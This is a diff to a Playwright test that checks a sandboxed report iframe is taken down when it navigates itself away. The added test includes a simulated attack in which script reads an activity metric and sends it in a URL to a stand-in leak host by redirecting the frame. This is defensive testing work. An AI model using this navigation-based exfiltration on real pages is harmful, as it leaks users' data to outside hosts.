@@ -145,21 +145,43 @@ test('a report runs nothing before its policy, even behind a comment that ends e
   expect(leaked).toEqual([]);
 });
 
-test('a report that navigates its frame away is taken down', async ({
+test('a report that navigates its frame away sends nothing and is taken down', async ({
   page,
 }) => {
+  const leaked = await leakedRequests(page);
   await mountEvening(page, 'report');
   await openReport(page);
   const report = page.frameLocator(frameSelector);
+  const takenDown = page.getByText(
+    'The report tried to open another page inside its frame',
+  );
+  const content = async () =>
+    (await page.locator(frameSelector).elementHandle())?.contentFrame();
   await expect(report.locator('html')).toHaveAttribute('data-messages', '1');
 
-  const handle = await page.locator(frameSelector).elementHandle();
-  const content = await handle?.contentFrame();
-  await content?.evaluate(() => {
+  // The report puts a number it was sent into an outside address and sends
+  // its own frame there.
+  await (await content())?.evaluate((host) => {
+    const minutes = document.querySelector(
+      '[data-metric="activeMinutes"]',
+    )?.textContent;
+    globalThis.location.href = `https://${host}/navigation?minutes=${minutes}`;
+  }, leakHost);
+  await expect(takenDown).toBeVisible();
+  await expect(page.locator(frameSelector)).toHaveCount(0);
+  expect(leaked).toEqual([]);
+
+  // Shown again, the report reloads under the same single page policy, and
+  // `about:blank`, which no policy refuses, takes it down as well.
+  await page.getByRole('button', { name: 'Hide the report' }).click();
+  await page.getByRole('button', { name: 'Show the report' }).click();
+  await expect(report.locator('html')).toHaveAttribute('data-messages', '1');
+  await expect(
+    page.locator('head > meta[http-equiv="Content-Security-Policy"]'),
+  ).toHaveCount(1);
+  await (await content())?.evaluate(() => {
     globalThis.location.href = 'about:blank';
   });
-  await expect(
-    page.getByText('The report tried to open another page inside its frame'),
-  ).toBeVisible();
+  await expect(takenDown).toBeVisible();
   await expect(page.locator(frameSelector)).toHaveCount(0);
 });
